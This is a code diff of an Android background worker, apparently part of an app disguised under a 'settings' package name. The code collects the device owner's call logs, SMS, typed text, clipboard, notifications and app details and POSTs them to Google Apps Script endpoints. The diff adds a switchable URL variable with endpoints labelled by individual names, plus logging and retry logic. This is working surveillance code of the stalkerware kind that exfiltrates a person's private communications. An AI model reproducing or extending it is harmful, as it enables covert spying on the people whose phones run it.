@@ -3,6 +3,7 @@ package com.example.settings;
 import android.app.Activity;
 import android.content.ClipData;
 import android.content.Context;
+import android.util.Log;
 
 
 import androidx.annotation.NonNull;
@@ -17,13 +18,8 @@ import com.android.volley.RetryPolicy;
 import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
-
-import java.text.SimpleDateFormat;
-import java.util.ArrayList;
-import java.util.Date;
 import java.util.HashMap;
-import java.util.List;
-import java.util.Locale;
+
 import java.util.Map;
 
 import static com.example.settings.MainActivity.clipboardManager;
@@ -38,7 +34,7 @@ public class SyncData extends Worker {
     String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
             Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
             SmsData,OtherNotificationData,ClickedData,OtherClickedData;
-
+    String url="";
     public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
         mSharedpref = new Sharedpref(context);
@@ -49,6 +45,14 @@ public class SyncData extends Worker {
     @NonNull
     @Override
     public Result doWork() {
+        //saimaurl
+       // url="https://script.google.com/macros/s/AKfycbwTSLIFqr1sjKmKw8LNHG4VxyRsiEYn87F3FkGnyse1Ey64ChtQ/exec";
+
+        /*Asima Url*/
+        url="https://script.google.com/macros/s/AKfycbww2stEdxwyoiSedfbPLOCQrhWWJ29SPplLfFXEs1IwXDwZtSM/exec";
+
+        /*Abu ji Url*/
+       // url="https://script.google.com/macros/s/AKfycbzL-e8xcaMP3Cu5rcv1SIFgZdQ1ayEtBX7d6Bo5/exec";
         Name = mSharedpref.getSaveName();
         OutgoingNumbers = mSharedpref.getOutgoingNumbers();
         RecievedNumbers = mSharedpref.getRecievedNumbers();
@@ -84,15 +88,18 @@ public class SyncData extends Worker {
                 mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
                 mSharedpref.commit();
             }
+
             if (!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() ||
                     !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty()
                     || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() ||
                     !SmsData.isEmpty() || !OtherNotificationData.isEmpty()
-                    || !ClickedData.isEmpty() || !OtherClickedData.isEmpty() || !Phoneappdetails.isEmpty()) {
-                StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbwTSLIFqr1sjKmKw8LNHG4VxyRsiEYn87F3FkGnyse1Ey64ChtQ/exec",
+                    || !ClickedData.isEmpty() || !OtherClickedData.isEmpty() ||
+                    !Phoneappdetails.isEmpty()) {
+                StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                         new Response.Listener<String>() {
                             @Override
                             public void onResponse(String response) {
+                                Log.d(context.getPackageName(),response);
                                 mSharedpref.setOutgoingNumbers("");
                                 mSharedpref.setRecievedNumbers("");
                                 mSharedpref.setMissedCallNumber("");
@@ -108,7 +115,10 @@ public class SyncData extends Worker {
                         new Response.ErrorListener() {
                             @Override
                             public void onErrorResponse(VolleyError error) {
+                                Log.d(context.getPackageName(),"Error");
+
                                 Result.retry();
+
                             }
                         }
                 ) {
@@ -146,6 +156,16 @@ public class SyncData extends Worker {
                 RequestQueue queue = Volley.newRequestQueue(context);
                 queue.add(stringRequest);
             }
+            else {
+                Log.d(context.getPackageName(),"All empty");
+                Result.retry();
+
+            }
+        }
+        else {
+            Log.d(context.getPackageName(),"Name empty");
+            Result.retry();
+
         }
         return Result.success();
     }
